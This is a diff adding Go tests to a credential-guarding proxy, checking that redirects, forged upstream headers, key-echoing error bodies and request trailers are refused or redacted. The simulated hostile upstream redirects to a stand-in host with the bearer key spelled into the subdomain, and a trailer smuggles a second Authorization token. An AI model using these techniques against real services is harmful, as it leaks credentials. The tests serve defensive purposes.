@@ -408,12 +408,90 @@ func TestUndecodableUpstreamErrorBodyIsWithheld(t *testing.T) {
 func TestRedirectIsNotFollowedOrRevealed(t *testing.T) {
 	f := newFixture(t, true)
 	f.configure(t, testConfig(1))
-	f.setHandler(func(w http.ResponseWriter, _ *http.Request) {
-		http.Redirect(w, &http.Request{}, "https://evil.example/collect", http.StatusFound)
+	f.setHandler(func(w http.ResponseWriter, r *http.Request) {
+		// The upstream holds the key and could spell it into the target's host name.
+		key := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
+		http.Redirect(w, &http.Request{}, "https://"+key+".evil.example/collect", http.StatusFound)
 	})
 	status, body, header := f.do(t, "POST", "https://model-a.example/v1/responses", bearer(placeholderA), "{}")
 	if status != 403 || header.Get("Location") != "" || strings.Contains(body, "evil.example") {
 		t.Fatalf("got %d %s location=%q", status, body, header.Get("Location"))
+	}
+	refused := 0
+	for _, event := range f.eventsAfter(t, 0) {
+		if event.ReasonCode == "redirect_denied" {
+			refused++
+			if event.RedirectHost != "" {
+				t.Fatalf("the log must not name the target of a redirect that may carry the key: %q", event.RedirectHost)
+			}
+		}
+	}
+	if refused != 1 {
+		t.Fatalf("the refused redirect is logged once: %d", refused)
+	}
+}
+
+// Only the gatekeeper marks answers as its own. An upstream sending its headers is still checked,
+// and an agent's X-Aiofcage-* headers never reach the upstream, which might echo them.
+func TestUpstreamCannotPassForTheGatekeeper(t *testing.T) {
+	f := newFixture(t, true)
+	f.configure(t, testConfig(1))
+	var forwarded []string
+	answer := "redirect"
+	f.setHandler(func(w http.ResponseWriter, r *http.Request) {
+		for name := range r.Header {
+			if strings.HasPrefix(strings.ToLower(name), "x-aiofcage-") {
+				forwarded = append(forwarded, name)
+			}
+		}
+		w.Header().Set("X-Aiofcage-Generated", "upstream_failed")
+		w.Header().Set("X-Aiofcage-Reason", "forged")
+		if answer == "redirect" {
+			http.Redirect(w, r, "https://evil.example/collect", http.StatusFound)
+			return
+		}
+		w.WriteHeader(http.StatusUnauthorized)
+		fmt.Fprintf(w, "invalid key %s", strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer "))
+	})
+	headers := bearer(placeholderA)
+	headers["X-Aiofcage-Generated"] = []string{"upstream_failed"}
+	status, body, header := f.do(t, "POST", "https://model-a.example/v1/responses", headers, "{}")
+	if status != 403 || header.Get("Location") != "" || header.Get("X-Aiofcage-Reason") != "redirect_denied" {
+		t.Fatalf("a redirect stays refused whatever the upstream claims: %d %v %s", status, header, body)
+	}
+	answer = "error"
+	status, body, header = f.do(t, "POST", "https://model-a.example/v1/responses", headers, "{}")
+	if status != 401 || strings.Contains(body, secretA) || header.Get("X-Aiofcage-Reason") != "" || header.Get("X-Aiofcage-Generated") != "" {
+		t.Fatalf("an error body stays redacted and the upstream's own headers are dropped: %d %v %s", status, header, body)
+	}
+	if len(forwarded) != 0 {
+		t.Fatalf("the agent's X-Aiofcage-* headers reached the upstream: %v", forwarded)
+	}
+	for _, event := range f.eventsAfter(t, 0) {
+		if event.ReasonCode == "upstream_failed" || event.ReasonCode == "forged" {
+			t.Fatalf("the upstream chose the logged reason: %+v", event)
+		}
+	}
+}
+
+// Trailers arrive after the body and Go forwards them upstream, past the credential checks.
+func TestRequestTrailersAreRefused(t *testing.T) {
+	f := newFixture(t, true)
+	f.configure(t, testConfig(1))
+	req, err := http.NewRequest("POST", "https://model-a.example/v1/responses", io.NopCloser(strings.NewReader("{}")))
+	if err != nil {
+		t.Fatal(err)
+	}
+	req.Header.Set("Authorization", "Bearer "+placeholderA)
+	req.ContentLength = -1
+	req.Trailer = http.Header{"Authorization": {"Bearer synthetic-foreign-token-0123456789"}}
+	resp, err := f.client.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	resp.Body.Close()
+	if resp.StatusCode != 403 || resp.Header.Get("X-Aiofcage-Reason") != "trailer_denied" || f.calls.Load() != 0 {
+		t.Fatalf("got %d %q, upstream calls %d", resp.StatusCode, resp.Header.Get("X-Aiofcage-Reason"), f.calls.Load())
 	}
 }
 
